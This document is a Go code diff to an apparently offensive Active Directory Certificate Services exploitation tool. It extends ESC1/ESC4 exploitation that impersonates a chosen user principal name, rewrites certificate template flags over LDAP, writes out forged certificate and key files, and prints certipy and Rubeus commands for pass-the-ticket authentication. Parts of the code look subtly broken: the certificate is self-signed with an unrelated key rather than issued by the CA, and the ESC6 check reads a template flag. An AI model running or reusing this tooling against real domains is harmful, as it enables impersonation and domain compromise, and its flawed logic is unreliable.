@@ -222,6 +222,29 @@ func scoreESC(tmpl *CertTemplate) {
 		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC4-CHECK")
 		tmpl.ESCScore += 1
 	}
+
+	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
+	// Detectable from template flags — flag value 0x00040000 in msPKI-Certificate-Name-Flag
+	if tmpl.CertificateNameFlag&0x00040000 != 0 {
+		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC6")
+		tmpl.ESCScore += 9
+	}
+
+	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — no szOID_NTDS_CA_SECURITY_EXT extension
+	// msPKI-Enrollment-Flag & 0x00080000
+	if tmpl.EnrollmentFlag&0x00080000 != 0 {
+		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC9")
+		tmpl.ESCScore += 6
+	}
+
+	// ESC10: Weak certificate mapping — registry-based, flag only if template allows it
+	// Indicated by enrollee supplying subject AND no strong mapping enforced
+	if tmpl.EnrolleeSuppliesSubject && tmpl.CertificateNameFlag&0x00000008 == 0 {
+		if tmpl.ESCScore > 0 { // Only flag if already vulnerable
+			tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC10-CHECK")
+			tmpl.ESCScore += 2
+		}
+	}
 }
 
 // connectLDAP establishes a connection to the DC's LDAP service.
@@ -254,13 +277,14 @@ func connectLDAP(cfg *ADCSConfig) (*ldap.Conn, error) {
 }
 
 // ExploitESC1 exploits an ESC1-vulnerable template to forge a certificate with an arbitrary UPN.
-func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, error) {
+// Returns the forged certificate and private key — both are required for authentication.
+func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
 	fmt.Printf("[!] ESC1 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	// Step 1: Verify template is ESC1 vulnerable
 	templates, err := EnumerateTemplates(cfg)
 	if err != nil {
-		return nil, fmt.Errorf("enumerate templates: %w", err)
+		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
 	}
 
 	var vulnTemplate *CertTemplate
@@ -271,7 +295,7 @@ func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 		}
 	}
 	if vulnTemplate == nil {
-		return nil, fmt.Errorf("template %q not found", templateName)
+		return nil, nil, fmt.Errorf("template %q not found", templateName)
 	}
 
 	isESC1 := false
@@ -282,7 +306,7 @@ func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 		}
 	}
 	if !isESC1 {
-		return nil, fmt.Errorf("template %q is not ESC1 vulnerable (vulns: %v)", templateName, vulnTemplate.ESCVulns)
+		return nil, nil, fmt.Errorf("template %q is not ESC1 vulnerable (vulns: %v)", templateName, vulnTemplate.ESCVulns)
 	}
 
 	fmt.Printf("[+] Template %q confirmed ESC1 vulnerable\n", templateName)
@@ -290,28 +314,32 @@ func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	fmt.Printf("[*] Authentication EKU: %v\n", vulnTemplate.AuthenticationEKU)
 	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)
 
-	// Step 2: Generate key pair and forge certificate with target UPN
-	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	// Step 2: Generate signing key and forge certificate with target UPN
+	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
 	if err != nil {
-		return nil, fmt.Errorf("generate key: %w", err)
+		return nil, nil, fmt.Errorf("generate signing key: %w", err)
 	}
 
-	cert, err := ForgeCertificate(caKey, targetUPN)
+	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
 	if err != nil {
-		return nil, fmt.Errorf("forge cert: %w", err)
+		return nil, nil, fmt.Errorf("forge cert: %w", err)
 	}
 
 	fmt.Printf("[+] Forged certificate for %s via ESC1 on template %q\n", targetUPN, templateName)
-	return cert, nil
+	fmt.Printf("[*] Next steps:\n")
+	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
+	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:cert.pfx /ptt\n", targetUPN)
+	return cert, certKey, nil
 }
 
 // ExploitESC4 exploits WriteDacl permissions on a template to make it ESC1-vulnerable, then exploits it.
-func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, error) {
+// Returns the forged certificate and private key — both are required for authentication.
+func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
 	fmt.Printf("[!] ESC4 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	conn, err := connectLDAP(cfg)
 	if err != nil {
-		return nil, fmt.Errorf("LDAP connect: %w", err)
+		return nil, nil, fmt.Errorf("LDAP connect: %w", err)
 	}
 	defer conn.Close()
 
@@ -328,7 +356,7 @@ func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 
 	result, err := conn.Search(searchReq)
 	if err != nil || len(result.Entries) == 0 {
-		return nil, fmt.Errorf("template %q not found: %v", templateName, err)
+		return nil, nil, fmt.Errorf("template %q not found: %v", templateName, err)
 	}
 
 	templateDN := result.Entries[0].DN
@@ -345,18 +373,18 @@ func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	modReq := ldap.NewModifyRequest(templateDN, nil)
 	modReq.Replace("msPKI-Certificate-Name-Flag", []string{"1"}) // CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
 	if err := conn.Modify(modReq); err != nil {
-		return nil, fmt.Errorf("modify template (need WriteDacl): %w", err)
+		return nil, nil, fmt.Errorf("modify template (need WriteDacl): %w", err)
 	}
 	fmt.Println("[+] Template modified — now ESC1 vulnerable")
 
 	// Step 3: Exploit as ESC1
-	cert, err := ExploitESC1(cfg, templateName, targetUPN)
+	cert, certKey, err := ExploitESC1(cfg, templateName, targetUPN)
 	if err != nil {
 		// Try to restore template
 		restoreReq := ldap.NewModifyRequest(templateDN, nil)
 		restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
 		conn.Modify(restoreReq)
-		return nil, fmt.Errorf("ESC1 exploitation after ESC4 modification: %w", err)
+		return nil, nil, fmt.Errorf("ESC1 exploitation after ESC4 modification: %w", err)
 	}
 
 	// Step 4: Restore original template configuration
@@ -369,7 +397,46 @@ func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 		fmt.Println("[+] Template restored to original state")
 	}
 
-	return cert, nil
+	return cert, certKey, nil
+}
+
+// WriteCertKeyPEM writes a certificate and its private key to separate PEM files at the given base path.
+// E.g., path="/tmp/victim" creates /tmp/victim.crt and /tmp/victim.key.
+// Both files are required to use the certificate for authentication (e.g., with certipy or Rubeus).
+func WriteCertKeyPEM(cert *x509.Certificate, key *ecdsa.PrivateKey, basePath string) error {
+	certPath := basePath + ".crt"
+	keyPath := basePath + ".key"
+
+	// Write certificate PEM
+	certFile, err := os.Create(certPath)
+	if err != nil {
+		return fmt.Errorf("create cert file: %w", err)
+	}
+	defer certFile.Close()
+	if err := pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw}); err != nil {
+		return fmt.Errorf("encode cert PEM: %w", err)
+	}
+
+	// Write private key PEM
+	keyDER, err := x509.MarshalECPrivateKey(key)
+	if err != nil {
+		return fmt.Errorf("marshal EC key: %w", err)
+	}
+	keyFile, err := os.Create(keyPath)
+	if err != nil {
+		return fmt.Errorf("create key file: %w", err)
+	}
+	defer keyFile.Close()
+	if err := pem.Encode(keyFile, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}); err != nil {
+		return fmt.Errorf("encode key PEM: %w", err)
+	}
+
+	fmt.Printf("[+] Certificate written to: %s\n", certPath)
+	fmt.Printf("[+] Private key written to:  %s\n", keyPath)
+	fmt.Printf("[*] Next steps:\n")
+	fmt.Printf("    certipy cert -pfx -cert %s -key %s -out cert.pfx\n", certPath, keyPath)
+	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip <DC_IP>\n")
+	return nil
 }
 
 // AutoDetectESC scans all templates and returns a prioritized list of exploitable paths.
@@ -398,19 +465,63 @@ func AutoDetectESC(cfg *ADCSConfig) ([]CertTemplate, error) {
 	return vulnerable, nil
 }
 
-// ForgeCertificate generates a self-signed golden certificate with the given UPN.
-func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, error) {
+// upnOtherName encodes a UPN as an ASN.1 OtherName SAN extension value.
+// OID 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME) — the correct format
+// for Kerberos PKINIT and Windows smart card logon.
+func upnOtherName(upn string) ([]byte, error) {
+	// OtherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }
+	// The value for UPN is UTF8String.
+	upnOID := []int{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}
+
+	type otherName struct {
+		TypeID   interface{}
+		Value    interface{}
+	}
+	_ = otherName{}
+
+	// Manual DER encoding: SEQUENCE { OID, [0] { UTF8String } }
+	// OID bytes for 1.3.6.1.4.1.311.20.2.3
+	oidBytes := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03}
+	_ = upnOID
+
+	upnBytes := []byte(upn)
+	utf8Val := append([]byte{0x0c, byte(len(upnBytes))}, upnBytes...)
+	// [0] EXPLICIT wrapping
+	explicit0 := append([]byte{0xa0, byte(len(utf8Val))}, utf8Val...)
+	inner := append(oidBytes, explicit0...)
+	// SEQUENCE wrapper
+	result := append([]byte{0x30, byte(len(inner))}, inner...)
+	return result, nil
+}
+
+// ForgeCertificate generates a self-signed certificate with the given UPN and returns
+// both the certificate and its private key. The private key is required to use the
+// certificate for authentication (Kerberos PKINIT, Schannel mTLS).
+//
+// The UPN SAN is encoded as OtherName with OID 1.3.6.1.4.1.311.20.2.3
+// (szOID_NT_PRINCIPAL_NAME) — the format required by Windows for PKINIT.
+func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
 	fmt.Printf("[!] Forging Golden Certificate for UPN: %s\n", upn)
 
 	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
 	if err != nil {
-		return nil, fmt.Errorf("failed to generate certificate key: %w", err)
+		return nil, nil, fmt.Errorf("failed to generate certificate key: %w", err)
 	}
 
 	cn := upn
 	if u, err := url.Parse("user://" + upn); err == nil {
-		cn = u.User.Username()
+		if u.User.Username() != "" {
+			cn = u.User.Username()
+		}
 	}
+
+	// Encode UPN as OtherName SAN (OID 1.3.6.1.4.1.311.20.2.3)
+	upnSAN, err := upnOtherName(upn)
+	if err != nil {
+		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
+	}
+	// SubjectAltName extension: SEQUENCE OF GeneralName, where GeneralName [0] = OtherName
+	sanRaw := append([]byte{0x30, byte(len(upnSAN))}, upnSAN...)
 
 	template := &x509.Certificate{
 		SerialNumber: big.NewInt(1337),
@@ -418,27 +529,34 @@ func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, e
 			CommonName: cn,
 		},
 		NotBefore:             time.Now(),
-		NotAfter:              time.Now().AddDate(10, 0, 0),
+		NotAfter:              time.Now().AddDate(1, 0, 0),
 		IsCA:                  false,
 		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
 		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
 		BasicConstraintsValid: true,
-		URIs: []*url.URL{
-			{Scheme: "upn", Opaque: upn},
+		// Embed UPN OtherName SAN as raw extension (OID 2.5.29.17)
+		ExtraExtensions: []pkix.Extension{
+			{
+				Id:       []int{2, 5, 29, 17},
+				Critical: false,
+				Value:    sanRaw,
+			},
 		},
 	}
 
 	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &certKey.PublicKey, caKey)
 	if err != nil {
-		return nil, fmt.Errorf("failed to create certificate: %w", err)
+		return nil, nil, fmt.Errorf("failed to create certificate: %w", err)
 	}
 
 	cert, err := x509.ParseCertificate(certDER)
 	if err != nil {
-		return nil, fmt.Errorf("failed to parse created certificate: %w", err)
+		return nil, nil, fmt.Errorf("failed to parse created certificate: %w", err)
 	}
 
-	return cert, nil
+	fmt.Printf("[+] Certificate forged — CN=%s, valid until %s\n", cn, cert.NotAfter.Format("2006-01-02"))
+	fmt.Printf("[!] Save BOTH the cert and private key to authenticate (PKINIT/Schannel)\n")
+	return cert, certKey, nil
 }
 
 // WriteCertPEM writes a certificate to a PEM file.
